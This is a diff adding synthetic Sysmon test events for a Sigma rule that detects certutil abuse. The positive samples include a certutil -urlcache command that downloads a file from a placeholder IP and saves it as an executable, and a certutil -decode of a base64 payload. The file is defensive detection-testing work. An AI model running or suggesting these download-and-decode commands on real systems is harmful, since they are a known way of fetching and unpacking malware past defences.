@@ -1,0 +1,36 @@
+# Positive/negative samples for rules/sigma/win_lolbas_certutil_download.yml (synthetic lab events)
+rule: win_lolbas_certutil_download.yml
+positive:
+- name: certutil URL cache download
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: certutil.exe -urlcache -split -f http://203.0.113.9/a.txt a.exe
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+- name: certutil base64 decode
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: certutil -decode payload.b64 payload.exe
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+negative:
+- name: certutil certificate dump
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil -dump C:\certs\root.cer'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+- name: Other binary with similar words
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\curl.exe'
+      CommandLine: curl -o urlcache.txt https://example.com
+      ParentImage: 'C:\Windows\System32\cmd.exe'
